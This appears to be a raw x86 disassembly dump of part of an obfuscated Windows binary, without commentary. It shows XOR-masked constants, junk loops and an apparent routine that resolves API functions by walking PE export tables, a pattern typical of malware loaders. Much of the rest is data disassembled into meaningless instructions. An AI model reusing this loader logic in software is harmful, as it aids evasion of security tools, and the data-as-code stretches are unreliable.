  40c5f8:	pop    es
  40c5f9:	sbb    DWORD PTR [edi+eax*1],ecx
  40c5fc:	add    al,0xc2
  40c5fe:	repz or esi,ebp
  40c601:	mov    eax,0x8a112aac
  40c606:	aaa    
  40c607:	rcl    esp,cl
  40c609:	dec    ebp
  40c60a:	leave  
  40c60b:	add    al,0x9e
  40c60d:	(bad)  
  40c60e:	lea    edi,[edx-0x3644d2d5]
  40c614:	or     ecx,edi
  40c616:	(bad)  
  40c617:	push   ds
  40c618:	push   esp
  40c619:	xchg   esp,eax
  40c61a:	je     0x40c655
  40c61c:	stc    
  40c61d:	sub    edx,edi
  40c61f:	or     ebx,DWORD PTR [edi-0xb5c7770]
  40c625:	fcmovu st,st(0)
  40c627:	scas   al,BYTE PTR es:[edi]
  40c628:	jle    0x40c64e
  40c62a:	shr    DWORD PTR [edi],0x66
  40c62d:	mov    BYTE PTR [ebp+0x37d3c87],dl
  40c633:	repnz xor eax,ecx
  40c636:	lea    eax,[eax+edi*1+0x64e5c0]
  40c63d:	mov    edi,DWORD PTR [ebp+0xc]
  40c640:	xor    edi,ecx
  40c642:	add    edi,edx
  40c644:	imul   eax,edi
  40c647:	mov    edi,DWORD PTR [ebp+0xc]
  40c64a:	xor    edi,ecx
  40c64c:	sub    edi,eax
  40c64e:	mov    eax,DWORD PTR [ebp-0x4]
  40c651:	add    edi,edx
  40c653:	cmp    DWORD PTR [eax],edi
  40c655:	mov    eax,DWORD PTR [ebp-0x4]
  40c658:	mov    edi,DWORD PTR [ebp+0x10]
  40c65b:	jg     0x40c66e
  40c661:	xor    edi,ecx
  40c663:	mov    ebx,esi
  40c665:	sub    ebx,edi
  40c667:	add    DWORD PTR [eax],ebx
  40c669:	jmp    0x40c674
  40c66e:	xor    edi,ecx
  40c670:	add    edi,edx
  40c672:	add    DWORD PTR [eax],edi
  40c674:	mov    eax,DWORD PTR [ebp-0x8]
  40c677:	mov    edi,DWORD PTR [ebp-0x10]
  40c67a:	mov    eax,DWORD PTR [eax]
  40c67c:	xor    edi,ecx
  40c67e:	add    edi,0x3272df
  40c684:	not    edi
  40c686:	and    eax,edi
  40c688:	movsx  di,BYTE PTR [eax+0x1]
  40c68d:	mov    ebx,0x3b50
  40c692:	sub    di,bx
  40c695:	mov    ebx,0x8a8c
  40c69a:	xor    di,bx
  40c69d:	mov    ebx,0x4f86
  40c6a2:	cmp    di,bx
  40c6a5:	jne    0x40c6cd
  40c6ab:	movsx  di,BYTE PTR [eax]
  40c6af:	mov    ebx,0x3b50
  40c6b4:	sub    di,bx
  40c6b7:	mov    ebx,0x8a8c
  40c6bc:	xor    di,bx
  40c6bf:	mov    ebx,0x4e71
  40c6c4:	cmp    di,bx
  40c6c7:	je     0x40c6dd
  40c6cd:	mov    edi,DWORD PTR [ebp-0x10]
  40c6d0:	xor    edi,ecx
  40c6d2:	mov    ebx,esi
  40c6d4:	sub    ebx,edi
  40c6d6:	add    eax,ebx
  40c6d8:	jmp    0x40c688
  40c6dd:	mov    esi,DWORD PTR [ebp-0x14]
  40c6e0:	mov    esi,DWORD PTR [esi]
  40c6e2:	mov    edi,DWORD PTR [eax+0x3c]
  40c6e5:	lea    esi,[edi+esi*8+0x78]
  40c6e9:	mov    esi,DWORD PTR [esi+eax*1]
  40c6ec:	mov    DWORD PTR [ebp-0x8],esi
  40c6ef:	mov    esi,DWORD PTR [ebp+0x8]
  40c6f2:	xor    esi,ecx
  40c6f4:	add    esi,edx
  40c6f6:	mov    DWORD PTR [ebp-0x14],esi
  40c6f9:	mov    esi,DWORD PTR [ebp+0x8]
  40c6fc:	mov    edi,DWORD PTR [ebp-0x8]
  40c6ff:	xor    esi,ecx
  40c701:	add    esi,edx
  40c703:	pop    ebx
  40c704:	cmp    edi,esi
  40c706:	jne    0x40c724
  40c70c:	mov    eax,DWORD PTR [ebp+0xc]
  40c70f:	xor    eax,ecx
  40c711:	mov    ecx,DWORD PTR [ebp-0x8]
  40c714:	add    eax,edx
  40c716:	imul   eax,ecx
  40c719:	mov    DWORD PTR [ebp-0x8],eax
  40c71c:	push   DWORD PTR [ebp+0x18]
  40c71f:	jmp    0x40c778
  40c724:	mov    ecx,DWORD PTR [ebp-0x8]
  40c727:	add    ecx,eax
  40c729:	mov    DWORD PTR [ebp-0x14],ecx
  40c72c:	mov    ecx,DWORD PTR [ebp-0x14]
  40c72f:	mov    ecx,DWORD PTR [ecx+0xc]
  40c732:	movsx  cx,BYTE PTR [ecx+eax*1]
  40c737:	mov    edx,0x3b50
  40c73c:	sub    cx,dx
  40c73f:	mov    edx,0x8a8c
  40c744:	xor    cx,dx
  40c747:	mov    edx,0x4e77
  40c74c:	cmp    cx,dx
  40c74f:	jne    0x40c71c
  40c755:	mov    ecx,DWORD PTR ds:0x42e313
  40c75b:	mov    ecx,DWORD PTR [ecx+0x198]
  40c761:	mov    DWORD PTR [ecx],eax
  40c763:	jmp    0x40c789
  40c768:	mov    ecx,DWORD PTR [ebp+0x18]
  40c76b:	cmp    ecx,0xf89c85b8
  40c771:	jne    0x40c789
  40c777:	push   eax
  40c778:	push   DWORD PTR [ebp+0x14]
  40c77b:	push   DWORD PTR [ebp+0x10]
  40c77e:	push   DWORD PTR [ebp+0xc]
  40c781:	push   DWORD PTR [ebp+0x8]
  40c784:	call   0x409ed5
  40c789:	pop    edi
  40c78a:	pop    esi
  40c78b:	leave  
  40c78c:	ret    0x14
  40c78f:	push   ebp
  40c790:	mov    ebp,esp
  40c792:	sub    esp,0xc
  40c795:	push   esi
  40c796:	mov    esi,DWORD PTR ds:0x41ac40
  40c79c:	mov    ecx,DWORD PTR ds:0x41abdd
  40c7a2:	sub    esi,ecx
  40c7a4:	xor    esi,DWORD PTR [esi+ecx*1]
  40c7a7:	mov    esi,0xf89c85b9
  40c7ac:	sub    ecx,edx
  40c7ae:	mov    DWORD PTR [ebp-0x8],esi
  40c7b1:	sub    DWORD PTR ds:0x42b010,edi
  40c7b7:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  40c7be:	and    DWORD PTR ds:0x42901c,0x0
  40c7c8:	mov    edx,DWORD PTR ds:0x42901c
  40c7ce:	inc    edx
  40c7cf:	mov    DWORD PTR ds:0x42901c,edx
  40c7d5:	cmp    DWORD PTR ds:0x42901c,0x24
  40c7dc:	jne    0x40c7ed
  40c7e2:	push   0x42e127
  40c7e7:	call   DWORD PTR ds:0x42e9cb
  40c7ed:	cmp    DWORD PTR ds:0x42901c,0x18
  40c7f4:	jb     0x40c7c8
  40c7fa:	push   edi
  40c7fb:	mov    eax,eax
  40c7fd:	mov    eax,DWORD PTR [ebp-0x4]
  40c800:	mov    edi,DWORD PTR [ebp-0x8]
  40c803:	mov    ecx,0x7510899
  40c808:	xor    eax,ecx
  40c80a:	sub    edx,0x2378
  40c810:	xor    edi,ecx
  40c812:	adc    DWORD PTR ds:0x429020,0x74b2
  40c81c:	mov    edx,0x3272e0
  40c821:	mov    DWORD PTR ds:0x42901c,0x186b
  40c82b:	add    edi,edx
  40c82d:	add    eax,edx
  40c82f:	imul   eax,edi
  40c832:	mov    DWORD PTR ds:0x42b000,edi
  40c838:	mov    edi,DWORD PTR [ebp+0xc]
  40c83b:	cmp    edi,eax
  40c83d:	je     0x40c8c6
  40c843:	mov    DWORD PTR [ebp-0xc],esi
  40c846:	mov    eax,DWORD PTR [ebp-0xc]
  40c849:	sbb    DWORD PTR ds:0x42b008,0x2a28
  40c853:	mov    esi,DWORD PTR [ebp+0xc]
  40c856:	sub    DWORD PTR ds:0x42b010,0xd18
  40c860:	xor    eax,ecx
  40c862:	lea    eax,[eax*8+0x1939778]
  40c869:	add    DWORD PTR ds:0x42c00c,0x2208
  40c873:	mov    eax,DWORD PTR [esi+eax*1]
  40c876:	mov    DWORD PTR [ebp+0xc],eax
  40c879:	not    esi
  40c87b:	mov    eax,DWORD PTR [ebp-0x4]
  40c87e:	mov    esi,DWORD PTR [ebp-0x8]
  40c881:	or     DWORD PTR ds:0x42d008,0x42c01c
  40c88b:	xor    eax,ecx
  40c88d:	xor    esi,ecx
  40c88f:	sbb    DWORD PTR ds:0x42a008,0x42d00c
  40c899:	add    esi,edx
  40c89b:	add    eax,edx
  40c89d:	imul   eax,esi
  40c8a0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8a3:	cmp    esi,eax
  40c8a5:	je     0x40c8c6
  40c8ab:	mov    eax,DWORD PTR [ebp-0x4]
  40c8ae:	xor    eax,ecx
  40c8b0:	mov    ecx,DWORD PTR [ebp+0xc]
  40c8b3:	add    eax,edx
  40c8b5:	imul   eax,ecx
  40c8b8:	add    eax,DWORD PTR [ebp+0x8]
  40c8bb:	mov    DWORD PTR [ebp+0xc],eax
  40c8be:	mov    eax,DWORD PTR [ebp+0xc]
  40c8c1:	jmp    0x40c8d7
  40c8c6:	mov    eax,DWORD PTR [ebp-0x4]
  40c8c9:	mov    esi,DWORD PTR [ebp-0x8]
  40c8cc:	xor    esi,ecx
  40c8ce:	xor    eax,ecx
  40c8d0:	add    esi,edx
  40c8d2:	add    eax,edx
  40c8d4:	imul   eax,esi
  40c8d7:	pop    edi
  40c8d8:	pop    esi
  40c8d9:	leave  
  40c8da:	ret    0x8
  40c8dd:	push   ebp
  40c8de:	mov    ebp,esp
  40c8e0:	push   ecx
  40c8e1:	add    edx,edx
  40c8e3:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  40c8ea:	adc    ecx,eax
  40c8ec:	mov    eax,DWORD PTR [ebp-0x4]
  40c8ef:	mov    edx,DWORD PTR [ebp+0x10]
  40c8f2:	mov    DWORD PTR ds:0x42b000,0x1c
  40c8fc:	cmp    DWORD PTR ds:0x42b000,0x0
  40c903:	je     0x40c957
  40c909:	cmp    DWORD PTR ds:0x42b000,0x8
  40c910:	jne    0x40c921
  40c916:	push   0x42c000
  40c91b:	call   DWORD PTR ds:0x42e9d3
  40c921:	cmp    DWORD PTR ds:0x42b000,0x9
  40c928:	jne    0x40c93b
  40c92e:	mov    ecx,DWORD PTR ds:0x42b000
  40c934:	dec    ecx
  40c935:	mov    DWORD PTR ds:0x42b000,ecx
  40c93b:	mov    ecx,DWORD PTR ds:0x42b000
  40c941:	dec    ecx
  40c942:	mov    DWORD PTR ds:0x42b000,ecx
  40c948:	jmp    0x40c8fc
  40c94d:	and    DWORD PTR ds:0x42c000,0x7708
  40c957:	mov    ecx,0x7510899
  40c95c:	xor    eax,ecx
  40c95e:	xor    DWORD PTR ds:0x42a018,0x429008
  40c968:	add    eax,0x3272e0
  40c96d:	mov    DWORD PTR [edx],eax
  40c96f:	mov    DWORD PTR ds:0x429018,0x10
  40c979:	cmp    DWORD PTR ds:0x429018,0x0
  40c980:	je     0x40c9d0
  40c986:	cmp    DWORD PTR ds:0x429018,0x4
  40c98d:	jne    0x40c9a8
  40c993:	push   0x42b008
  40c998:	push   0x429024
  40c99d:	push   0x42d000
  40c9a2:	call   DWORD PTR ds:0x42e993
  40c9a8:	cmp    DWORD PTR ds:0x429018,0x5
  40c9af:	jne    0x40c9c0
  40c9b5:	mov    eax,ds:0x429018
  40c9ba:	dec    eax
  40c9bb:	mov    ds:0x429018,eax
  40c9c0:	mov    eax,ds:0x429018
  40c9c5:	dec    eax
  40c9c6:	mov    ds:0x429018,eax
  40c9cb:	jmp    0x40c979
  40c9d0:	mov    eax,DWORD PTR [ebp+0xc]
  40c9d3:	xor    eax,ecx
  40c9d5:	push   esi
  40c9d6:	mov    esi,DWORD PTR [ebp+0x10]
  40c9d9:	mov    edx,0x3272e0
  40c9de:	add    eax,edx
  40c9e0:	mov    DWORD PTR [esi+0x4],eax
  40c9e3:	mov    eax,DWORD PTR [ebp+0x14]
  40c9e6:	mov    esi,DWORD PTR [ebp+0x10]
  40c9e9:	mov    DWORD PTR [esi+0x8],eax
  40c9ec:	mov    eax,DWORD PTR [ebp+0x18]
  40c9ef:	mov    esi,DWORD PTR [ebp+0x10]
  40c9f2:	mov    DWORD PTR [esi+0xc],eax
  40c9f5:	mov    eax,DWORD PTR [ebp+0x1c]
  40c9f8:	mov    esi,DWORD PTR [ebp+0x10]
  40c9fb:	mov    DWORD PTR [esi+0x10],eax
  40c9fe:	mov    eax,DWORD PTR [ebp+0x8]
  40ca01:	xor    eax,ecx
  40ca03:	add    eax,edx
  40ca05:	pop    esi
  40ca06:	leave  
  40ca07:	ret    0x18
  40ca0a:	push   ebp
  40ca0b:	mov    ebp,esp
  40ca0d:	sub    esp,0x9c
  40ca13:	mov    ecx,DWORD PTR [ebp+0x8]
  40ca16:	mov    DWORD PTR ds:0x429004,0x1d
  40ca20:	cmp    DWORD PTR ds:0x429004,0x0
  40ca27:	je     0x40cae1
  40ca2d:	cmp    DWORD PTR ds:0x429004,0x2
  40ca34:	jne    0x40ca4b
  40ca3a:	push   DWORD PTR [ebp-0x10]
  40ca3d:	push   DWORD PTR [ebp-0x24]
  40ca40:	push   0x1cdf
  40ca45:	call   DWORD PTR ds:0x42e997
  40ca4b:	cmp    DWORD PTR ds:0x429004,0x3
  40ca52:	jne    0x40ca66
  40ca58:	xor    eax,eax
  40ca5a:	add    eax,DWORD PTR ds:0x429004
  40ca60:	dec    eax
  40ca61:	mov    ds:0x429004,eax
  40ca66:	xor    eax,eax
  40ca68:	add    eax,DWORD PTR ds:0x429004
  40ca6e:	dec    eax
  40ca6f:	mov    ds:0x429004,eax
  40ca74:	jmp    0x40ca20
  40ca79:	and    DWORD PTR ds:0x42b00c,0x0
  40ca83:	mov    eax,ds:0x42b00c
  40ca88:	inc    eax
  40ca89:	mov    ds:0x42b00c,eax
  40ca8e:	cmp    DWORD PTR ds:0x42b00c,0x6
  40ca95:	jne    0x40cabc
  40ca9b:	push   DWORD PTR [ebp-0x28]
  40ca9e:	push   DWORD PTR [ebp-0xc]
  40caa1:	push   0x42b000
  40caa6:	push   DWORD PTR [ebp-0x20]
  40caa9:	push   0x567e
  40caae:	push   0x641c
  40cab3:	push   DWORD PTR [ebp-0x24]
  40cab6:	call   DWORD PTR ds:0x42e99f
  40cabc:	cmp    DWORD PTR ds:0x42b00c,0x5
  40cac3:	jne    0x40cad4
  40cac9:	mov    eax,ds:0x42b00c
  40cace:	inc    eax
  40cacf:	mov    ds:0x42b00c,eax
  40cad4:	cmp    DWORD PTR ds:0x42b00c,0x15
  40cadb:	jb     0x40ca83
  40cae1:	mov    eax,0x8a8c
  40cae6:	xor    ax,WORD PTR [ecx+0x20]
  40caea:	and    DWORD PTR ds:0x42c008,0x0
  40caf4:	jmp    0x40cb08
  40caf9:	xor    ecx,ecx
  40cafb:	or     ecx,DWORD PTR ds:0x42c008
  40cb01:	inc    ecx
  40cb02:	mov    DWORD PTR ds:0x42c008,ecx
  40cb08:	cmp    DWORD PTR ds:0x42c008,0x14
  40cb0f:	jae    0x40cb9f
  40cb15:	cmp    DWORD PTR ds:0x42c008,0x18
  40cb1c:	jne    0x40cb3d
  40cb22:	push   0x42d00c
  40cb27:	push   DWORD PTR [ebp-0x24]
  40cb2a:	push   0x42e0d9
  40cb2f:	push   0x627f
  40cb34:	push   DWORD PTR [ebp-0x1c]
  40cb37:	call   DWORD PTR ds:0x42e9a3
  40cb3d:	jmp    0x40caf9
  40cb42:	mov    DWORD PTR ds:0x42c010,0x15
  40cb4c:	cmp    DWORD PTR ds:0x42c010,0x0
  40cb53:	je     0x40cb9f
  40cb59:	cmp    DWORD PTR ds:0x42c010,0xa
  40cb60:	jne    0x40cb71
  40cb66:	push   0x42a000
  40cb6b:	call   DWORD PTR ds:0x42e9ab
  40cb71:	cmp    DWORD PTR ds:0x42c010,0xb
  40cb78:	jne    0x40cb8d
  40cb7e:	xor    ecx,ecx
  40cb80:	xor    ecx,DWORD PTR ds:0x42c010
  40cb86:	dec    ecx
  40cb87:	mov    DWORD PTR ds:0x42c010,ecx
  40cb8d:	mov    ecx,DWORD PTR ds:0x42c010
  40cb93:	dec    ecx
  40cb94:	mov    DWORD PTR ds:0x42c010,ecx
  40cb9a:	jmp    0x40cb4c
  40cb9f:	mov    ecx,0x3b50
  40cba4:	sub    DWORD PTR ds:0x42900c,0x429000
  40cbae:	add    ax,cx
  40cbb1:	movzx  eax,ax
  40cbb4:	mov    DWORD PTR ds:0x42b000,0x10
  40cbbe:	cmp    DWORD PTR ds:0x42b000,0x0
  40cbc5:	je     0x40cc00
  40cbcb:	cmp    DWORD PTR ds:0x42b000,0x17
  40cbd2:	jne    0x40cbee
  40cbd8:	push   0x898b
  40cbdd:	push   DWORD PTR [ebp-0x10]
  40cbe0:	push   0x429018
  40cbe5:	push   DWORD PTR [ebp-0xc]
  40cbe8:	call   DWORD PTR ds:0x42e9af
  40cbee:	mov    ecx,DWORD PTR ds:0x42b000
  40cbf4:	dec    ecx
  40cbf5:	mov    DWORD PTR ds:0x42b000,ecx
  40cbfb:	jmp    0x40cbbe
  40cc00:	mov    DWORD PTR [ebp-0x10],eax
  40cc03:	movzx  ecx,BYTE PTR ds:0x42d010
  40cc0a:	or     ecx,DWORD PTR ds:0x42a014
  40cc10:	mov    DWORD PTR ds:0x42d010,ecx
  40cc16:	mov    BYTE PTR [ebp-0x1],0x79
  40cc1a:	lea    eax,[ebp-0x1]
  40cc1d:	and    ecx,DWORD PTR ds:0x42b014
  40cc23:	mov    DWORD PTR [ebp-0xc],eax
  40cc26:	xor    DWORD PTR ds:0x42a00c,edx
  40cc2c:	jmp    0x40efb2
  40cc31:	mov    esp,0xfb9ef6c5
  40cc36:	lea    edx,[ebx+ecx*8+0x3e7be512]
  40cc3d:	cld    
  40cc3e:	gs je  0x40cbfa
  40cc41:	clc    
  40cc42:	in     eax,0x7a
  40cc44:	jp     0x40cc47
  40cc46:	pop    edi
  40cc47:	jp     0x40ccc3
  40cc49:	aad    0xe6
  40cc4b:	mov    ebx,0xa3cee674
  40cc50:	inc    eax
  40cc51:	mov    cl,dl
  40cc53:	jecxz  0x40cc4d
  40cc55:	mov    ecx,0x5fc11739
  40cc5a:	pop    ecx
  40cc5b:	fs dec ecx
  40cc5d:	pop    esi
  40cc5e:	pop    ebx
  40cc5f:	fs mov ebx,0xe08392cf
  40cc65:	ret    
  40cc66:	mov    dl,0xcf
  40cc68:	add    ah,BYTE PTR [ebx+0x4584722f]
  40cc6e:	xchg   ecx,eax
  40cc6f:	xchg   ebx,eax
  40cc70:	mov    ch,0xef
  40cc72:	or     al,0x69
  40cc74:	pop    ecx
  40cc75:	push   ebp
  40cc76:	imul   eax,ebx,0xffffffc8
  40cc79:	push   edi
  40cc7a:	push   edx
  40cc7b:	cmp    ch,0xf6
  40cc7e:	cli    
  40cc7f:	call   FWORD PTR [ebp+0x5f112718]
  40cc85:	icebp  
  40cc86:	clc    
  40cc87:	mov    edx,DWORD PTR ds:0xd1da93b1
  40cc8d:	sbb    ch,dh
  40cc8f:	inc    esi
  40cc90:	adc    eax,0xc5bf1d94
  40cc95:	(bad)  
  40cc97:	cmp    BYTE PTR [edi],bl
  40cc99:	pushf  
  40cc9a:	adc    eax,0x5f7289ef
  40cc9f:	xchg   ebx,eax
  40cca0:	sbb    al,0xcc
  40cca2:	xchg   BYTE PTR [ecx],bl
  40cca4:	mov    eax,0x94cd1b08
  40cca9:	bound  ebp,QWORD PTR [ecx+esi*1]
  40ccac:	xor    DWORD PTR [eax+0x40],eax
  40ccaf:	jno    0x40cd1d
  40ccb1:	dec    ebx
  40ccb2:	mov    edi,0xe2353a86
  40ccb7:	cdq    
  40ccb8:	jp     0x40cce5
  40ccba:	push   esi
  40ccbb:	repnz adc dh,BYTE PTR [edx+0x10]
  40ccbf:	fldenv [esi+edx*4]
  40ccc2:	add    ebp,DWORD PTR [ecx-0x599ed226]
  40ccc8:	shl    BYTE PTR [ebx-0x3],1
  40cccb:	dec    esp
  40cccc:	sbb    BYTE PTR [eax+0x39],dh
  40cccf:	xchg   BYTE PTR [esi+ebp*1-0x57],ah
  40ccd3:	es jae 0x40cc69
  40ccd6:	in     eax,0x26
  40ccd8:	frstor [ecx-0x47]
  40ccdb:	cld    
  40ccdc:	sbb    ah,ch
  40ccde:	push   eax
  40ccdf:	jns    0x40ccfd
  40cce1:	sub    al,cl
  40cce3:	int3   
  40cce4:	rcl    BYTE PTR [esp+ebx*2-0x46f7ace5],1
  40cceb:	mov    esp,0xb1f3b382
  40ccf0:	adc    cl,BYTE PTR [edx-0x5f]
  40ccf3:	pop    ecx
  40ccf4:	jnp    0x40ccb9
  40ccf6:	mov    esp,0x4bf5dbe1
  40ccfb:	lods   eax,DWORD PTR ds:[esi]
  40ccfc:	(bad)  
  40ccfd:	gs and al,0xd5
  40cd00:	sahf   
  40cd01:	or     eax,0x94845bb3
  40cd06:	pop    eax
  40cd07:	dec    eax
  40cd08:	nop
  40cd09:	outs   dx,DWORD PTR ds:[esi]
  40cd0a:	mov    bh,0xa2
  40cd0c:	test   DWORD PTR [ecx+0x688d9158],ecx
  40cd12:	retf   0x2aed
  40cd15:	jb     0x40ccc4
  40cd17:	pop    ebx
  40cd18:	xchg   edi,eax
  40cd19:	inc    esi
  40cd1a:	sbb    DWORD PTR [edx+0x36],esi
  40cd1d:	das    
  40cd1e:	mov    dh,0x86
  40cd20:	and    esi,ecx
  40cd22:	sbb    DWORD PTR [eax+0x27],esi
  40cd25:	add    eax,0xe7ea8f8a
  40cd2a:	or     bh,BYTE PTR [esp+ecx*8+0x41]
  40cd2e:	icebp  
  40cd2f:	xchg   ebp,eax
  40cd30:	imul   DWORD PTR [ebp+0x23]
  40cd33:	cmp    ecx,ecx
  40cd35:	(bad)  
  40cd37:	arpl   WORD PTR [esi],bp
  40cd39:	add    DWORD PTR [ebx-0x2],esi
  40cd3c:	lea    edx,[esi]
  40cd3e:	les    ecx,FWORD PTR [ecx+0x65]
  40cd41:	sub    DWORD PTR [ebp-0x65],edx
  40cd44:	inc    ecx
  40cd45:	mov    al,0xe8
  40cd47:	std    
  40cd48:	out    dx,al
  40cd49:	xor    eax,ebp
  40cd4b:	test   BYTE PTR [ebx-0x14],ch
  40cd4e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40cd50:	add    esp,DWORD PTR [ebx]
  40cd52:	scas   al,BYTE PTR es:[edi]
  40cd53:	push   edi
  40cd54:	pop    ebx
  40cd55:	add    BYTE PTR [edi-0xce8975a],bl
  40cd5b:	push   ebp
  40cd5c:	(bad)  
  40cd5d:	push   ecx
  40cd5e:	dec    edi
  40cd5f:	xchg   esi,eax
  40cd60:	add    ebp,ecx
  40cd62:	imul   edi,DWORD PTR [eax],0xffffff82
  40cd65:	int    0xbb
  40cd67:	cmp    DWORD PTR [eax-0x72],ecx
  40cd6a:	mov    ah,0xf6
  40cd6c:	jae    0x40cd70
  40cd6e:	fist   WORD PTR [edx-0x75087e5d]
  40cd74:	das    
  40cd75:	mov    WORD PTR [ecx],ss
  40cd77:	pop    ebp
  40cd78:	mov    bh,0xb7
  40cd7a:	(bad)  
  40cd7b:	gs ss int 0xd4
  40cd7f:	stos   DWORD PTR es:[edi],eax
  40cd80:	pop    ebp
  40cd81:	aas    
  40cd82:	mov    WORD PTR [edi],?
  40cd84:	dec    edi
  40cd85:	bound  ebx,QWORD PTR ds:0x770926d6
  40cd8b:	push   ss
  40cd8c:	test   cl,al
  40cd8e:	pop    edx
  40cd8f:	or     cl,bl
  40cd91:	js     0x40cd6f
  40cd93:	int3   
  40cd94:	push   0x19e1dce
  40cd99:	jg     0x40cdad
  40cd9b:	cmovl  ebp,DWORD PTR [esp+edi*1-0x33]
  40cda0:	mov    al,0x15
  40cda2:	lahf   
  40cda3:	test   DWORD PTR ds:0x5529803d,ebp
  40cda9:	mov    ch,0x6d
  40cdab:	dec    ebx
  40cdac:	jo     0x40cdba
  40cdae:	fadd   DWORD PTR [edi-0x255df208]
  40cdb4:	inc    esi
  40cdb5:	add    BYTE PTR cs:[ecx+0x1b74c714],ah
  40cdbc:	sub    dh,BYTE PTR [esi-0x6425f9c0]
  40cdc2:	repnz pop edx
  40cdc4:	rol    DWORD PTR [ebx+0x62587dbb],1
  40cdca:	test   al,0x3d
  40cdcc:	scas   al,BYTE PTR es:[edi]
  40cdcd:	xlat   BYTE PTR ds:[ebx]
  40cdce:	scas   eax,DWORD PTR es:[edi]
  40cdcf:	mov    ds:0x67a6580f,al
  40cdd4:	lock nop/reserved BYTE PTR [edx]
  40cdd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdd9:	mov    bh,0x6d
  40cddb:	loope  0x40cdc9
  40cddd:	and    eax,0x7289cf2
  40cde2:	lea    ebx,[edi-0x12dfc5c7]
  40cde8:	dec    esi
  40cde9:	push   ebx
  40cdea:	adc    eax,0x3d92cb1c
  40cdf0:	scas   eax,DWORD PTR es:[edi]
  40cdf1:	or     al,0x79
  40cdf3:	inc    ecx
  40cdf4:	mov    edx,0x2dbfa892
  40cdf9:	mov    ds,WORD PTR [edx+0x45]
  40cdfc:	enter  0x3795,0x1a
  40ce00:	fidiv  WORD PTR [edi-0x3051a0cc]
  40ce06:	cmp    edx,DWORD PTR [edi+0x73]
  40ce09:	test   DWORD PTR [eax-0x7102e4ac],ecx
  40ce0f:	jmp    0x386b:0xb9b31dce
  40ce16:	shl    DWORD PTR [edi+0x37],cl
  40ce19:	mov    ebp,0x58c80051
  40ce1e:	sbb    al,0x5b
  40ce20:	xor    bh,BYTE PTR [edi-0x63]
  40ce23:	dec    esp
  40ce24:	int    0xce
  40ce26:	add    BYTE PTR [ecx-0x1b],cl
  40ce29:	mov    al,0x25
  40ce2b:	stc    
  40ce2c:	inc    edi
  40ce2d:	int3   
  40ce2e:	out    dx,al
  40ce2f:	lock in eax,0x3b
  40ce32:	mov    al,0x1
  40ce34:	or     cl,BYTE PTR [edx-0x7520da05]
  40ce3a:	lods   al,BYTE PTR ds:[esi]
  40ce3b:	out    0x40,eax
  40ce3d:	stos   BYTE PTR es:[edi],al
  40ce3e:	mov    ds:0x5a538ef8,eax
  40ce43:	jb     0x40ceaf
  40ce45:	mov    ch,0x8d
  40ce47:	cmp    BYTE PTR [ebx+0x2071f632],bl
  40ce4d:	or     BYTE PTR [edi-0x10],dh
  40ce50:	mov    cl,0xe4
  40ce52:	xchg   esp,eax
  40ce53:	call   0x802:0x7d0ecbe4
  40ce5a:	or     DWORD PTR ds:0x5202d2e4,esp
  40ce60:	popa   
  40ce61:	lods   eax,DWORD PTR ds:[esi]
  40ce62:	outs   dx,DWORD PTR ds:[esi]
  40ce63:	leave  
  40ce64:	dec    eax
  40ce65:	jae    0x40cee1
  40ce67:	push   ecx
  40ce68:	dec    esp
  40ce69:	adc    cl,BYTE PTR [ebp+0xad21076]
  40ce6f:	pop    ss
  40ce70:	js     0x40ce7b
  40ce72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce73:	nop
  40ce74:	xchg   bh,al
  40ce76:	inc    eax
  40ce77:	stos   BYTE PTR es:[edi],al
  40ce78:	push   esi
  40ce79:	cmp    al,0x6b
  40ce7b:	call   0x28dc:0x4cb14d51
  40ce82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce83:	out    0xef,al
  40ce85:	rcl    DWORD PTR [ecx-0x73b681f4],cl
  40ce8b:	fidivr WORD PTR [ebx+esi*1-0x23]
  40ce8f:	enter  0x9011,0xc2
  40ce93:	(bad)  
  40ce94:	fist   DWORD PTR [edx+0x69572bb2]
  40ce9a:	mov    dh,0xb
  40ce9c:	jmp    0x946e:0x75670c5a
  40cea3:	jmp    FWORD PTR [ebx-0x5c4c7334]
  40cea9:	retf   0xd4fb
  40ceac:	jg     0x40cef5
  40ceae:	retf   
  40ceaf:	ds xor cl,cl
  40ceb2:	iret   
  40ceb3:	fmul   st,st(6)
  40ceb5:	sbb    al,0xdc
  40ceb7:	sub    ah,BYTE PTR [ebp+0x45]
  40ceba:	cld    
  40cebb:	xchg   ebx,eax
  40cebc:	jnp    0x40ce8d
  40cebe:	xor    ch,bl
  40cec0:	push   0x55
  40cec2:	pop    esp
  40cec3:	adc    BYTE PTR [ecx+0x36edbe8e],cl
  40cec9:	adc    DWORD PTR [ebp-0x6d],ecx
  40cecc:	and    BYTE PTR [eax+0x71],0xfc
  40ced0:	out    dx,eax
  40ced1:	inc    edi
  40ced2:	mov    ds:0x1d0a0a87,al
  40ced7:	add    dh,BYTE PTR [ecx+0x57b890b]
  40cedd:	push   ecx
  40cede:	adc    eax,0x1d1e9443
  40cee3:	jl     0x40cf5f
  40cee5:	das    
  40cee6:	std    
  40cee7:	fnstcw WORD PTR [ecx]
  40cee9:	sub    al,0x84
  40ceeb:	aaa    
  40ceec:	mov    bh,0x42
  40ceee:	cld    
  40ceef:	mov    BYTE PTR [edi-0x8],al
  40cef2:	mov    cl,0x8b
  40cef4:	jge    0x40ceed
  40cef6:	push   esi
  40cef7:	and    eax,0x9a3867e
  40cefc:	mov    ebx,0x4b75831a
  40cf01:	sbb    DWORD PTR [esi],esp
  40cf03:	std    
  40cf04:	scas   al,BYTE PTR es:[edi]
  40cf05:	inc    edx
  40cf06:	rcr    BYTE PTR [ebp+0x3e],1
  40cf09:	iret   
  40cf0a:	arpl   WORD PTR [edi+esi*8+0x4],bp
  40cf0e:	test   BYTE PTR [edi-0x4e4e7a08],cl
  40cf14:	(bad)
  40cf18:	add    al,0xfc
  40cf1a:	enter  0x5469,0xe4
  40cf1e:	test   al,0xe4
  40cf20:	inc    edi
  40cf21:	xchg   ebx,eax
  40cf22:	mov    ah,0xb4
  40cf24:	ds jns 0x40ced3
  40cf27:	popf   
  40cf28:	mov    dl,al
  40cf2a:	cwde   
  40cf2b:	cli    
  40cf2c:	pop    ds
  40cf2d:	sbb    al,0xc8
  40cf2f:	mov    edx,eax
  40cf31:	(bad)  
